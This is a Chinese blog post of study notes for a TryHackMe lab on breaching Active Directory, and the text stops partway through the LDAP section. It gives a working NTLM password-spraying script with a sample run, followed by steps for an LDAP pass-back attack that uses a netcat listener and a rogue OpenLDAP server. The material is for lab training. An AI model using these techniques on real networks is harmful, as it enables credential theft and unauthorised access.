<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM域学习BreachingActiveDirectory | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction to AD Breaches全球财富 1000 强公司中约 90% 使用 Active Directory (AD)。 如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。 然而，由于AD用于整个产业的身份和访问管理，它掌握着王国的钥匙，使其很可能成为攻击者的目标">
<meta property="og:type" content="article">
<meta property="og:title" content="THM域学习BreachingActiveDirectory">
<meta property="og:url" content="http://mikannse.space/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0BreachingActiveDirectory/index.html">
<meta property="og:site_name" content="MikannseのSekai">
<meta property="og:description" content="Introduction to AD Breaches全球财富 1000 强公司中约 90% 使用 Active Directory (AD)。 如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。 然而，由于AD用于整个产业的身份和访问管理，它掌握着王国的钥匙，使其很可能成为攻击者的目标">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2024-04-12T14:11:40.000Z">
<meta property="article:modified_time" content="2024-07-14T13:00:43.153Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="Domain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0BreachingActiveDirectory/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'THM域学习BreachingActiveDirectory',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-07-14 21:00:43'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">277</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THM域学习BreachingActiveDirectory</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-12T14:11:40.000Z" title="发表于 2024-04-12 22:11:40">2024-04-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-14T13:00:43.153Z" title="更新于 2024-07-14 21:00:43">2024-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>34分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THM域学习BreachingActiveDirectory"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction-to-AD-Breaches"><a href="#Introduction-to-AD-Breaches" class="headerlink" title="Introduction to AD Breaches"></a>Introduction to AD Breaches</h1><p>全球财富 1000 强公司中约 90% 使用 Active Directory (AD)。 如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。 然而，由于AD用于整个产业的身份和访问管理，它掌握着王国的钥匙，使其很可能成为攻击者的目标。</p>
<p>破坏活动目录</p>
<p>在我们利用 AD 错误配置进行权限提升、横向移动和目标执行之前，您首先需要初始访问权限。 您需要获取一组初始的有效 AD 凭据。 由于 AD 服务和功能的数量众多，获取一组初始 AD 凭据的攻击面通常很大。 在这个房间里，我们将讨论几种途径，但这绝不是详尽的列表。</p>
<p>在查找第一组凭据时，我们不会关注与帐户关联的权限；而是关注与帐户相关的权限。 因此，即使是低权限帐户也足够了。 我们只是在寻找一种对 AD 进行身份验证的方法，使我们能够对 AD 本身进行进一步的枚举。</p>
<p>学习目标</p>
<p>在这个网络中，我们将介绍几种可用于破坏 AD 的方法。 这绝不是完整的列表，因为每天都会发现新的方法和技术。 但是，我们将介绍以下技术来恢复此网络中的 AD 凭据：</p>
<ul>
<li><p>NTLM 认证服务</p>
</li>
<li><p>LDAP 绑定凭证</p>
</li>
<li><p>身份验证中继</p>
</li>
<li><p>微软部署工具包</p>
</li>
<li><p>配置文件</p>
<p>我们可以通过针对面向互联网的组织的系统或通过在组织的网络上植入恶意设备来使用这些技术进行安全评估。</p>
</li>
</ul>
<h1 id="OSINT-and-Phishing"><a href="#OSINT-and-Phishing" class="headerlink" title="OSINT and Phishing"></a>OSINT and Phishing</h1><p>获取第一组 AD 凭据的两种流行方法是开源情报 (OSINT) 和网络钓鱼。 我们在这里仅简单提及这两种方法，因为它们已经在其他房间中进行了更深入的介绍。</p>
<p><strong>OSINT</strong></p>
<p>OSINT 用于发现已公开披露的信息。 就 AD 凭据而言，发生这种情况的原因有多种，例如：</p>
<ul>
<li>在 <a target="_blank" rel="noopener" href="https://stackoverflow.com/">Stack Overflow</a> 等公共论坛上提问但在问题中披露敏感信息（例如凭据）的用户。</li>
<li>使用硬编码凭据将脚本上传到 <a target="_blank" rel="noopener" href="https://github.com/">Github</a> 等服务的开发人员。</li>
<li>由于员工使用其工作帐户注册其他外部网站，过去的违规行为中凭证被泄露。 <a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">HaveIBeenPwned</a> 和 <a target="_blank" rel="noopener" href="https://www.dehashed.com/">DeHashed</a> 等网站提供了出色的平台，可以确定某人的信息（例如工作电子邮件）是否曾经参与过 众所周知的数据泄露。</li>
</ul>
<p>通过使用 OSINT 技术，有可能恢复公开披露的凭据。 如果我们足够幸运找到凭证，我们仍然需要找到一种方法来测试它们是否有效，因为 OSINT 信息可能会过时。 在任务 3 中，我们将讨论 NTLM 身份验证服务，它可能提供一个极好的途径来测试凭据以查看它们是否仍然有效。</p>
<p><strong>Phishing</strong></p>
<p>网络钓鱼是另一种破坏 AD 的绝佳方法。 网络钓鱼通常会诱使用户在恶意网页上提供凭据，或要求他们运行特定的应用程序，该应用程序会在后台安装远程访问特洛伊木马 (RAT)。 这是一种流行的方法，因为 RAT 会在用户的上下文中执行，从而立即允许您模拟该用户的 AD 帐户。 这就是为什么网络钓鱼对于红队和蓝队来说都是一个大话题。</p>
<h1 id="NTLM-Authenticated-Services"><a href="#NTLM-Authenticated-Services" class="headerlink" title="NTLM Authenticated Services"></a>NTLM Authenticated Services</h1><p>NTLM and NetNTLM</p>
<p>新技术 LAN 管理器 (NTLM) 是一套用于在 AD 中验证用户身份的安全协议。 NTLM 可用于通过使用称为 NetNTLM 的基于质询-响应的方案进行身份验证。 这种身份验证机制被网络上的服务大量使用。 但是，使用 NetNTLM 的服务也可以暴露在互联网上。 以下是一些流行的例子：</p>
<ul>
<li>公开 Outlook Web App (OWA) 登录门户的内部托管 Exchange（邮件）服务器。</li>
<li>暴露于互联网的服务器的远程桌面协议（RDP）服务。</li>
<li>与 AD 集成的公开 VPN 端点。</li>
<li>面向互联网并使用 NetNTLM 的 Web 应用程序。</li>
</ul>
<p>NetNTLM，通常也称为 Windows 身份验证或 NTLM 身份验证，允许应用程序扮演客户端和 AD 之间的中间人的角色。 所有身份验证材料都以质询的形式转发到域控制器，如果成功完成，应用程序将对用户进行身份验证。</p>
<p>这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。 这可以防止应用程序存储 AD 凭据，该凭据应仅存储在域控制器上。 这个过程如下图所示：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png" alt="img"></p>
<p>暴力登录攻击</p>
<p>如任务 2 中所述，这些公开的服务提供了一个极好的位置来测试使用其他方式发现的凭据。 但是，也可以直接使用这些服务来尝试恢复一组初始的有效 AD 凭据。 如果我们在最初的红队侦察期间恢复了有效电子邮件地址等信息，我们也许可以尝试使用它们进行暴力攻击。</p>
<p>由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。 相反，我们需要执行密码喷射攻击。 我们不会尝试多个不同的密码，这可能会触发帐户锁定机制，而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证。 但是，应该注意的是，由于这些类型的攻击将生成大量失败的身份验证尝试，因此可以检测到这些类型的攻击。</p>
<p>您已获得在红队 OSINT 练习中发现的用户名列表。 OSINT 活动还显示了该组织的初始入职密码，似乎是“Changeme123”。 尽管用户应始终更改其初始密码，但我们知道用户经常忘记。 我们将使用定制开发的脚本针对托管在以下 URL 的 Web 应用程序进行密码喷射：<a target="_blank" rel="noopener" href="http://ntlmauth.za.tryhackme.com./">http://ntlmauth.za.tryhackme.com。</a></p>
<p>导航到 URL，我们可以看到它提示我们输入 Windows 身份验证凭据：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5f18e5326d5a50d656d1827221bdcac7.png" alt="img"></p>
<p><strong>注意：</strong> <em>Firefox 的 Windows 身份验证插件非常容易失败。 如果您想手动测试凭据，建议使用 Chrome。</em></p>
<p>我们可以使用 <a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-Hydra">Hydra</a> 等工具来协助密码喷射攻击。 然而，通常最好自己编写这些类型的攻击脚本，这样您就可以更好地控制该过程。 任务文件中提供了一个基本的Python脚本，可用于密码喷射攻击。 以下函数是脚本的主要组成部分：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">password_spray</span>(<span class="params">self, password, url</span>):</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">"[*] Starting passwords spray attack using the following password: "</span> + password)</span><br><span class="line">    <span class="comment">#Reset valid credential counter</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="comment">#Iterate through all of the possible usernames</span></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> self.users:</span><br><span class="line">        <span class="comment">#Make a request to the website and attempt Windows Authentication</span></span><br><span class="line">        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + <span class="string">"\\"</span> + user, password))</span><br><span class="line">        <span class="comment">#Read status code of response to determine if authentication was successful</span></span><br><span class="line">        <span class="keyword">if</span> (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">"[+] Valid credential pair found! Username: "</span> + user + <span class="string">" Password: "</span> + password)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (self.verbose):</span><br><span class="line">            <span class="keyword">if</span> (response.status_code == self.HTTP_AUTH_FAILED_CODE):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">"[-] Failed login with Username: "</span> + user)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">"[*] Password spray attack completed, "</span> + <span class="built_in">str</span>(count) + <span class="string">" valid credential pairs found"</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>此函数将我们建议的密码和我们定位的 URL 作为输入，并尝试使用文本文件中的每个用户名对 URL 进行身份验证。 通过监控应用程序的 HTTP 响应代码的差异，我们可以确定凭证对是否有效。 如果凭证对有效，应用程序将使用 200 HTTP (OK) 代码进行响应。 如果该对无效，应用程序将返回 401 HTTP（未经授权）代码。</p>
<p>Password Spraying</p>
<p>如果您使用 AttackBox，则在“/root/Rooms/BreachingAD/task3/”目录下提供了密码喷射脚本和用户名文本文件。 我们可以使用以下命令运行该脚本：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们为每个参数提供以下值：</p>
<ul>
<li><strong><userfile></userfile></strong> - 包含我们用户名的文本文件 - <em>“usernames.txt”</em></li>
<li><strong><fqdn></fqdn></strong> - 与我们正在攻击的组织关联的完全限定域名 - <em>“za.tryhackme.com”</em></li>
<li><strong><password></password></strong> - 我们要用于喷射攻击的密码 - <em>“Changeme123”</em></li>
<li><strong><attackurl></attackurl></strong> - 支持 Windows 身份验证的应用程序的 URL - <em>“<a target="_blank" rel="noopener" href="http://ntlmauth.za.tryhackme.com/">http://ntlmauth.za.tryhackme.com</a>“</em></li>
</ul>
<p>使用这些参数，我们应该从密码喷射攻击中获得一些有效的凭据对。</p>
<p>​          NTLM Password Spraying Attack      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         [thm@thm]$ python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/</span><br><span class="line">[*] Starting passwords spray attack using the following password: Changeme123</span><br><span class="line">[-] Failed login with Username: anthony.reynolds</span><br><span class="line">[-] Failed login with Username: henry.taylor</span><br><span class="line">[...]</span><br><span class="line">[+] Valid credential pair found! Username: [...] Password: Changeme123</span><br><span class="line">[-] Failed login with Username: louise.talbot</span><br><span class="line">[...]</span><br><span class="line">[*] Password spray attack completed, [X] valid credential pairs found</span><br><span class="line">      </span><br></pre></td></tr></tbody></table></figure>

<p>结合使用 OSINT 和 NetNTLM 密码喷射，我们现在拥有了第一个有效的凭据对，可用于进一步枚举 AD！</p>
<h1 id="LDAP-Bind-Credentials"><a href="#LDAP-Bind-Credentials" class="headerlink" title="LDAP Bind Credentials"></a>LDAP Bind Credentials</h1><p>LDAP</p>
<p>应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 (LDAP) 身份验证。 LDAP 身份验证与 NTLM 身份验证类似。 但是，通过 LDAP 身份验证，应用程序可以直接验证用户的凭据。 该应用程序有一对 AD 凭据，可以首先使用它们来查询 LDAP，然后验证 AD 用户的凭据。</p>
<p>LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的一种流行机制。 其中包括应用程序和系统，例如：</p>
<ul>
<li>Gitlab</li>
<li>Jenkins</li>
<li>Custom-developed web applications</li>
<li>Printers</li>
<li>VPNs</li>
</ul>
<p>如果这些应用程序或服务中的任何一个暴露在互联网上，则可以使用与针对 NTLM 身份验证系统的攻击相同类型的攻击。 然而，由于使用 LDAP 身份验证的服务需要一组 AD 凭据，因此它开辟了额外的攻击途径。 本质上，我们可以尝试恢复服务使用的 AD 凭据，以获得对 AD 的经过身份验证的访问。 通过LDAP进行认证的流程如下所示：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png" alt="img"></p>
<p>如果您可以在正确的主机（例如 Gitlab 服务器）上站稳脚跟，那么恢复这些 AD 凭据可能就像读取配置文件一样简单。 这些凭证通常以纯文本形式存储在配置文件中，因为安全模型依赖于保持位置和存储配置文件的安全而不是其内容的安全。 任务中更深入地介绍了配置文件</p>
<ol start="7">
<li></li>
</ol>
<p>LDAP 回传攻击</p>
<p>然而，可以针对 LDAP 身份验证机制执行另一种非常有趣的攻击，称为 LDAP 回传攻击。 当您获得对内部网络的初始访问权限（例如在会议室中插入恶意设备）时，这是针对网络设备（例如打印机）的常见攻击。</p>
<p>当我们访问指定 LDAP 参数的设备配置时，可以执行 LDAP 回传攻击。 例如，这可以是网络打印机的 Web 界面。 通常，这些接口的凭据保留为默认凭据，例如“admin:admin”或“admin:password”。 在这里，我们无法直接提取 LDAP 凭据，因为密码通常是隐藏的。 但是，我们可以更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。 在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。 我们可以拦截此身份验证尝试以恢复 LDAP 凭据。</p>
<p>执行 LDAP 回传</p>
<p>该网络中有一台网络打印机，管理网站甚至不需要凭据。 导航至 <a target="_blank" rel="noopener" href="http://printer.za.tryhackme.com/settings.aspx">http://printer.za.tryhackme.com/settings.aspx</a> 以查找打印机的设置页面：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png" alt="img"></p>
<p>使用浏览器检查，我们还可以验证打印机网站是否至少足够安全，而不仅仅是将 LDAP 密码发送回浏览器：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c7cfe0419d3ebe9534d4caefcd1a5511.png" alt="img"></p>
<p>所以我们有用户名，但没有密码。 但是，当我们按测试设置时，我们可以看到向域控制器发出身份验证请求以测试 LDAP 凭据。 让我们尝试利用此漏洞让打印机连接到我们，这会泄露凭据。 为此，我们使用一个简单的 Netcat 侦听器来测试是否可以让打印机连接到我们。 由于LDAP的默认端口是389，我们可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -lvp 389</span><br></pre></td></tr></tbody></table></figure>

<p>​          Netcat LDAP Listener      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         [thm@thm]$ nc -lvp 389</span><br><span class="line">listening on [any] 389 ...</span><br><span class="line">10.10.10.201: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765</span><br><span class="line">0?DC?;</span><br><span class="line">?</span><br><span class="line">?x</span><br><span class="line"> objectclass0?supportedCapabilities</span><br></pre></td></tr></tbody></table></figure>

<p>您可能需要多次尝试才能接收回连接，但它应该会在 5 秒内响应。 “supportedCapability”响应告诉我们遇到了问题。 本质上，在打印机发送凭据之前，它会尝试协商 LDAP 身份验证方法详细信息。 它将使用此协商来选择打印机和 LDAP 服务器都支持的最安全的身份验证方法。 如果身份验证方法太安全，则凭据将不会以明文形式传输。 对于某些身份验证方法，凭据根本不会通过网络传输！ 所以我们不能只使用普通的 Netcat 来获取凭据。 我们需要创建一个恶意 LDAP 服务器并对其进行不安全的配置，以确保凭证以明文形式发送。</p>
<p>托管恶意 LDAP 服务器</p>
<p>有多种方法可以托管恶意 LDAP 服务器，但我们将在本示例中使用 OpenLDAP。 如果您使用 AttackBox，则已经为您安装了 OpenLDAP。 但是，如果您使用自己的攻击机器，则需要使用以下命令安装 OpenLDAP：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd</span><br></pre></td></tr></tbody></table></figure>

<p>然而，您还必须在 AttackBox 上配置您自己的恶意 LDAP 服务器。 我们将首先使用以下命令重新配置 LDAP 服务器：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo dpkg-reconfigure -p low slapd</span><br></pre></td></tr></tbody></table></figure>

<p>如果您想跳过服务器配置，请确保在请求时按&lt;否&gt;：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png" alt="img"></p>
<p>对于 DNS 域名，您需要提供我们的目标域，即“za.tryhackme.com”：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png" alt="img"></p>
<p>组织名称也使用相同的名称：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png" alt="img"></p>
<p>提供任何管理员密码：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png" alt="img"></p>
<p>选择 MDB 作为要使用的 LDAP 数据库：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png" alt="img"></p>
<p>对于最后两个选项，请确保清除时数据库不会被删除：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png" alt="img"></p>
<p>在创建新数据库文件之前移动旧数据库文件：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png" alt="img"></p>
<p>在使用恶意 LDAP 服务器之前，我们需要通过降级支持的身份验证机制来使其容易受到攻击。 我们希望确保我们的 LDAP 服务器仅支持 PLAIN 和 LOGIN 身份验证方法。 为此，我们需要创建一个新的 ldif 文件，并使用以下内容进行调用：</p>
<p>​          olcSaslSecProps.ldif      </p>
